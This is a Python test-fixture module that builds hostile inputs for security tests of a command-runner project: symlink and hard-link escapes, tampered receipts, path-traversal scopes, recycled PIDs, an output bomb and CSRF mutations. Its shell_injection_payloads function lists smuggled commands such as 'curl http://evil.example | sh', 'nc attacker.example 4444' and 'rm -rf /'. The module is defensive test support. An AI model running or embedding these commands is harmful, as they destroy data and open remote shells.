"""Reusable hostile-state builders for December Command v2 sabotage tests.

Additive test-support only. This module changes no production code, and pytest
does not collect it: its name matches neither ``test_*.py`` nor ``*_test.py``
under the repository's default discovery, so it is imported only when a test
asks for it. Each public builder constructs exactly one named hostile state and
nothing else; ``tests/test_sabotage_fixtures.py`` proves that relation
test-locally, with a witness drawn from the standard library rather than from
the builder, and spot-proves the portal and outward-hard-link planters against
the real CMD-4 route-containment gate in :mod:`conductor.command.preview`.

Design rules this library keeps so the fixtures stay honest:

* A builder never judges its own output. The relation each names is checked by
  its test with an independent witness (``os.readlink`` for a portal,
  ``os.path.samefile`` and ``st_nlink`` for an alias, ``json.loads`` for
  tampered bytes). Both sides of a check may not come from one function.
* Platform-dependent primitives (symlink, junction, hard link) raise
  :class:`SabotageUnavailable` instead of skipping. A caller decides whether an
  unavailable primitive is a skip or a hard failure; :func:`skip_when_unavailable`
  is the documented bridge to ``pytest.skip`` for callers that want a skip.
* Nothing here executes an attack. The output-bomb builder writes a fake
  executable that a runner under test invokes; the foreign-PID builders return
  descriptors, never a live process. The library reaches the filesystem only
  where a test hands it an explicit path.
"""
from __future__ import annotations

import contextlib
import json
import os
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from conductor.command.adapters.base import AdapterVerification
from conductor.command.contracts import ActionRequest, ControlMode, DecisionReceipt

#: A valid-shaped digest for receipts a test does not bind to a real run. A test
#: that reconciles a receipt against a seeded run passes that run's own digest.
PLACEHOLDER_DIGEST = "sha256:" + "a" * 64
CHANGED_DIGEST = "sha256:" + "b" * 64


class SabotageUnavailable(RuntimeError):
    """A hostile primitive this platform or filesystem refuses to create."""


@contextlib.contextmanager
def skip_when_unavailable():
    """Translate :class:`SabotageUnavailable` into ``pytest.skip`` for a caller.

    The platform-skip idiom, kept out of the builders themselves so the library
    carries no hard dependency on pytest: ``pytest`` is imported only when an
    unavailable primitive is actually raised inside the block.
    """
    try:
        yield
    except SabotageUnavailable as exc:
        import pytest

        pytest.skip(str(exc))


# --- portal and alias planters: a name whose bytes are, or also are, elsewhere ---


def plant_symlink(link: Any, target: Any, *, directory: bool = False) -> Path:
    """Plant a symbolic link at ``link`` pointing to ``target``.

    Windows grants the symlink privilege rather than assuming it, so a platform
    that declines is a :class:`SabotageUnavailable`, not a failure.
    """
    link, target = Path(link), Path(target)
    try:
        link.symlink_to(target, target_is_directory=directory)
    except (OSError, NotImplementedError) as exc:
        raise SabotageUnavailable(
            f"this platform did not permit a symbolic link: {exc}") from exc
    return link


def plant_junction(link: Any, target: Any) -> Path:
    """Plant an NTFS directory junction at ``link`` pointing to ``target``.

    A junction needs no privilege on Windows and answers ``is_dir()`` True while
    carrying its own reparse tag; elsewhere the primitive is unavailable.
    """
    link, target = Path(link), Path(target)
    try:
        import _winapi

        _winapi.CreateJunction(str(target), str(link))
    except (ImportError, AttributeError, OSError) as exc:
        raise SabotageUnavailable(
            f"this platform cannot make a junction: {exc}") from exc
    return link


def plant_route_portal(
        link: Any, target: Any, *, kind: str = "junction",
        directory: bool = True) -> Path:
    """Plant a directory portal (``kind`` in ``{"junction", "symlink"}``)."""
    if kind == "junction":
        return plant_junction(link, target)
    if kind == "symlink":
        return plant_symlink(link, target, directory=directory)
    raise ValueError(f"unknown portal kind {kind!r}")


def plant_outward_hard_link(inside_file: Any, outside_path: Any) -> Path:
    """Give ``inside_file``'s bytes a second name at ``outside_path``.

    After this the two names share one inode: writing through the inside name
    also writes the outside one. NTFS needs no privilege; a filesystem that
    cannot hard-link at all raises :class:`SabotageUnavailable`.
    """
    inside_file, outside_path = Path(inside_file), Path(outside_path)
    try:
        os.link(inside_file, outside_path)
    except OSError as exc:
        raise SabotageUnavailable(
            f"this filesystem did not permit a hard link: {exc}") from exc
    return outside_path


# --- decision-receipt bytes: honest, tampered, and stale/foreign ---


def decision_receipt(**overrides: Any) -> DecisionReceipt:
    """A valid approve receipt; ``overrides`` build tampered or stale variants."""
    values: dict[str, Any] = {
        "receipt_id": "decision-001",
        "run_id": "run-001",
        "gate_id": "release",
        "action": "approve",
        "actor": "release-owner",
        "decided_at": "2026-08-11T09:02:00Z",
        "reason": "Reviewed the attached evidence.",
        "scope_refs": ("release",),
        "config_digest": PLACEHOLDER_DIGEST,
    }
    values.update(overrides)
    return DecisionReceipt(**values)


def _receipt_line(wrapper: dict[str, Any]) -> bytes:
    """The one canonical journal spelling of a decision wrapper, as bytes."""
    return (json.dumps(
        wrapper, ensure_ascii=False, sort_keys=True,
        separators=(",", ":")) + "\n").encode("utf-8")


def receipt_bytes(decision: DecisionReceipt) -> bytes:
    """The honest, canonically wrapped bytes of ``decision`` — the baseline."""
    return _receipt_line({"record": decision.as_dict(), "record_type": "decision"})


def tampered_receipt_bytes(
        decision: DecisionReceipt, *, action: str = "reject",
        reason: str = "Body rewritten after the receipt was published.") -> bytes:
    """Bytes for a receipt whose decision body was altered after the fact.

    The receipt keeps its identity — same ``receipt_id``, ``run_id`` and
    ``gate_id`` — while the recorded decision flips. A tamper check that
    compares a published receipt against what the run recorded must refuse it.
    """
    return receipt_bytes(decision_receipt(
        receipt_id=decision.receipt_id, run_id=decision.run_id,
        gate_id=decision.gate_id, actor=decision.actor,
        decided_at=decision.decided_at, scope_refs=decision.scope_refs,
        config_digest=decision.config_digest, action=action, reason=reason))


def uncontracted_receipt_bytes(decision: DecisionReceipt) -> bytes:
    """Bytes carrying an out-of-contract field smuggled beside the record.

    The wrapper gains a top-level key the contract does not define, so a reader
    that rejects non-canonical or uncontracted wrappers refuses the receipt.
    """
    return _receipt_line({
        "record": decision.as_dict(), "record_type": "decision",
        "action": "reject"})


def stale_receipt_bytes(
        decision: DecisionReceipt, *, foreign_run_id: str = "run-elsewhere") -> bytes:
    """Bytes for a receipt decided under a different run than the one it lands in.

    A decision from another run cannot satisfy this run's gate; reconciling it
    into the target run must refuse it as belonging elsewhere.
    """
    return receipt_bytes(decision_receipt(
        receipt_id=decision.receipt_id, run_id=foreign_run_id,
        gate_id=decision.gate_id, action=decision.action, actor=decision.actor,
        decided_at=decision.decided_at, reason=decision.reason,
        scope_refs=decision.scope_refs, config_digest=decision.config_digest))


# --- Confirm freshness and duplicate-idempotency inputs ---


@dataclass(frozen=True)
class ConfirmationFixture:
    """An independently shaped confirmation for future CONF-1 sabotage tests.

    This is deliberately not a production contract. CONF-1 must define that
    contract; the fixture only freezes the hostile facts the gate must compare:
    run, action, canonical preview digest, confirmation time, and expiry.
    """

    run_id: str
    action_id: str
    preview_digest: str
    confirmed_at: str
    expires_at: str


def fresh_confirmation() -> ConfirmationFixture:
    """The fixed, fresh baseline from which one fact at a time is sabotaged."""
    return ConfirmationFixture(
        run_id="run-001", action_id="action-001",
        preview_digest=PLACEHOLDER_DIGEST,
        confirmed_at="2026-08-13T08:00:00Z",
        expires_at="2026-08-13T08:05:00Z")


def expired_confirmation() -> ConfirmationFixture:
    """A confirmation whose deadline passed before the fixed authorization time."""
    return ConfirmationFixture(
        run_id="run-001", action_id="action-001",
        preview_digest=PLACEHOLDER_DIGEST,
        confirmed_at="2026-08-13T07:50:00Z",
        expires_at="2026-08-13T07:55:00Z")


def changed_digest_confirmation() -> ConfirmationFixture:
    """A fresh-looking confirmation bound to another canonical preview digest."""
    original = fresh_confirmation()
    return ConfirmationFixture(
        run_id=original.run_id, action_id=original.action_id,
        preview_digest=CHANGED_DIGEST,
        confirmed_at=original.confirmed_at, expires_at=original.expires_at)


def action_request(**overrides: Any) -> ActionRequest:
    """One valid Confirm request; overrides make paired hostile requests."""
    values: dict[str, Any] = {
        "action_id": "action-001", "run_id": "run-001",
        "attempt_id": "attempt-001", "instance_id": "codex-dev",
        "capability": "dispatch", "arguments": {"handoff": "packet-001"},
        "scope": ("src",), "requested_by": "release-owner",
        "requested_at": "2026-08-13T08:00:00Z",
        "idempotency_key": "dispatch-001", "timeout_seconds": 900,
        "preview_digest": PLACEHOLDER_DIGEST, "mode": ControlMode.CONFIRM,
    }
    values.update(overrides)
    return ActionRequest(**values)


def conflicting_idempotency_requests() -> tuple[ActionRequest, ActionRequest]:
    """Two different actions that claim the same idempotency identity."""
    first = action_request()
    second = action_request(
        action_id="action-002", attempt_id="attempt-002",
        arguments={"handoff": "packet-002"})
    return first, second


# --- path-escape argv/scope sets and shell-injection strings ---


def path_escape_scopes() -> tuple[tuple[str, ...], ...]:
    """Scope tuples that leave the project root, each a distinct escape shape.

    Parent traversal, a POSIX absolute path, a Windows absolute path, a
    backslash-smuggled separator, and the empty component. A request whose
    working-directory scope must stay canonical and beneath the root refuses
    every one.
    """
    return (
        ("../secrets",),
        ("/etc/passwd",),
        ("C:/Windows/System32",),
        ("src\\outside",),
        ("",),
    )


def path_escape_cwds(project_root: Any) -> tuple[Path, ...]:
    """Working directories that resolve outside ``project_root``.

    A runner that pins ``cwd`` beneath the project root must refuse each: the
    parent itself, a parent reached through ``..``, two unrelated absolute
    roots, and a path that climbs back out through ``..`` after descending.
    """
    root = Path(project_root)
    return (
        root.parent,
        root / ".." / "outside",
        Path("/etc"),
        Path("C:/Windows"),
        root / "sub" / ".." / ".." / "escape",
    )


def shell_injection_payloads() -> tuple[str, ...]:
    """Argument strings that inject a second command if pasted into a shell.

    Each carries a shell control operator — ``;``, ``&&``, ``|``, ``$( )``,
    backticks, ``&``, or a raw newline — so a design that forbids unrestricted
    shell strings and builds structured argv must never expand them.
    """
    return (
        "src; rm -rf ~",
        "handoff && curl http://evil.example | sh",
        "$(reboot)",
        "`shutdown -h now`",
        "first\nrm -rf /",
        "x | nc attacker.example 4444",
        "y & del C:\\Windows\\System32",
    )


def write_argv_probe(directory: Any) -> Path:
    """Write a fake executable that JSON-echoes the argv elements it received."""
    script = Path(directory) / "argv_probe.py"
    body = (
        "import json\n"
        "import sys\n"
        "sys.stdout.write(json.dumps(sys.argv[1:], separators=(',', ':')))\n"
        "sys.stdout.write('\\n')\n"
        "sys.stdout.flush()\n"
    )
    with open(script, "w", encoding="utf-8", newline="\n") as handle:
        handle.write(body)
    return script


# --- foreign / recycled process ownership descriptors ---


@dataclass(frozen=True)
class ProcessOwnership:
    """A recorded process identity: the PID and the start token that pins it.

    Law 2 lets December stop only a process it started AND recorded, so a
    faithful ownership record is the pair, never the PID alone — a bare PID is
    exactly what recycling makes ambiguous.
    """

    pid: int
    start_token: str


def recorded_owner(pid: int = 4321, start_token: str = "owned-start-001") -> ProcessOwnership:
    """The process December did start and record — the legitimate baseline."""
    return ProcessOwnership(pid=pid, start_token=start_token)


def foreign_pid(owner: ProcessOwnership) -> ProcessOwnership:
    """A different process entirely: neither the PID nor the token is the owner's."""
    return ProcessOwnership(pid=owner.pid + 100000, start_token="foreign-start")


def recycled_pid(owner: ProcessOwnership) -> ProcessOwnership:
    """The owner's PID reused by the OS for a new process — token no longer matches.

    The dangerous case: the number December recorded now names something it did
    not start. An ownership check that reads only the PID would stop a stranger.
    """
    return ProcessOwnership(pid=owner.pid, start_token="recycled-start")


# --- bounded-output and interruption fake executables ---


def write_output_bomb(
        directory: Any, *, size_bytes: int, stream: str = "stdout") -> Path:
    """Write a deterministic fake executable that emits ``size_bytes`` and stops.

    Run as ``[sys.executable, str(returned_path)]``, it writes exactly
    ``size_bytes`` bytes to the named stream and exits 0. A runner with bounded
    capture must truncate rather than buffer the whole flood. The script is
    plain and finite: it is an output bomb, not a fork bomb or a spinner.
    """
    if size_bytes < 0:
        raise ValueError("size_bytes must not be negative")
    if stream not in ("stdout", "stderr"):
        raise ValueError(f"unknown stream {stream!r}")
    script = Path(directory) / "output_bomb.py"
    body = (
        "import sys\n"
        f"target = {int(size_bytes)}\n"
        f"out = sys.{stream}.buffer\n"
        "chunk = b'A' * 4096\n"
        "written = 0\n"
        "while written < target:\n"
        "    take = min(len(chunk), target - written)\n"
        "    out.write(chunk[:take])\n"
        "    written += take\n"
        "out.flush()\n"
    )
    with open(script, "w", encoding="utf-8", newline="\n") as handle:
        handle.write(body)
    return script


def write_blocking_executable(directory: Any, *, wait_seconds: int = 60) -> Path:
    """Write a finite child that announces STARTED, then blocks for a timeout.

    A runner can use the same script to sabotage timeout, disconnect, restart,
    and stop. The announcement is constant and flushed before the wait, so the
    test can prove the child started without depending on timing or a live PID.
    """
    if not 1 <= wait_seconds <= 300:
        raise ValueError("wait_seconds must be from 1 through 300")
    script = Path(directory) / "blocking_child.py"
    body = (
        "import sys\n"
        "import time\n"
        "sys.stdout.write('{\"attempt_id\":\"attempt-001\",\"event\":\"started\"}\\n')\n"
        "sys.stdout.flush()\n"
        f"time.sleep({wait_seconds})\n"
        "sys.stdout.write('{\"attempt_id\":\"attempt-001\",\"event\":\"finished\"}\\n')\n"
        "sys.stdout.flush()\n"
    )
    with open(script, "w", encoding="utf-8", newline="\n") as handle:
        handle.write(body)
    return script


# --- explicit verification failure ---


def mismatched_verification(action_id: str = "action-001") -> AdapterVerification:
    """An adapter's explicit mismatch; process success must not erase it."""
    return AdapterVerification(
        adapter_id="codex", action_id=action_id, state="mismatch",
        observed_at="2026-08-13T08:01:00Z",
        detail="Expected evidence digest does not match the observed bytes.")


# --- hostile browser mutation envelopes for API-1 ---


@dataclass(frozen=True)
class BrowserMutation:
    """Headers presented by one hostile browser mutation request."""

    name: str
    host: str
    origin: str | None
    csrf_token: str | None


def hostile_browser_mutations(
        *, host: str = "127.0.0.1:8765",
        origin: str = "http://127.0.0.1:8765",
        csrf_token: str = "csrf-process-001") -> tuple[BrowserMutation, ...]:
    """One-factor failures against the future same-origin plus CSRF relation."""
    return (
        BrowserMutation("cross-origin", host, "https://evil.example", csrf_token),
        BrowserMutation("missing-origin", host, None, csrf_token),
        BrowserMutation("foreign-host", "evil.example", origin, csrf_token),
        BrowserMutation("missing-token", host, origin, None),
        BrowserMutation("wrong-token", host, origin, "csrf-process-elsewhere"),
    )
